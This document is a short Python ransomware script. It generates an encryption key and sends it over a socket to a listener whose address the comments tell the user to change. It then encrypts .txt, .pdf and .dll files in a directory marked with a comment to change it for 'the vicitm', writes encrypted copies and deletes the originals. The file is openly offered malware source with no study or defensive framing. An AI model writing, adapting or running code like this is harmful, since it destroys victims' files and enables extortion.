from cryptography.fernet import Fernet
import os
import socket


def MakeKey():
    thegenkey = Fernet.generate_key() # generates thegenkey 
    main = thegenkey.decode("utf-8")
    global KeyObjFer
    KeyObjFer = Fernet(thegenkey)
  

    connection = socket.socket()
    connection.connect(('127.0.0.1',2000)) #modify according to network 
    connection.send(main.encode())
    connection.close()


def LocateandEncrypt():
    for fileonsys in os.listdir('/home/abis/Desktop/project'): #modify according to the vicitm 
        if fileonsys.endswith(".txt") or fileonsys.endswith(".pdf") or fileonsys.endswith(".dll"): #add as many file extensions 
            print(os.path.join("", fileonsys))

            filenames = os.path.join("", fileonsys)
            
            with open(filenames, 'rb') as before_enc_file:
                before_enc = before_enc_file.read()

            encryptedinfo = KeyObjFer.encrypt(before_enc)

            with open (filenames + ".encrypted", 'wb') as createEncrypted:
                createEncrypted.write(encryptedinfo)

    for fileonsys in os.listdir('/home/abis/Desktop/project'): #modify according to the vicitm 
        if fileonsys.endswith(".txt") or fileonsys.endswith(".pdf") or fileonsys.endswith(".dll"):
            os.remove(fileonsys)



MakeKey()
LocateandEncrypt()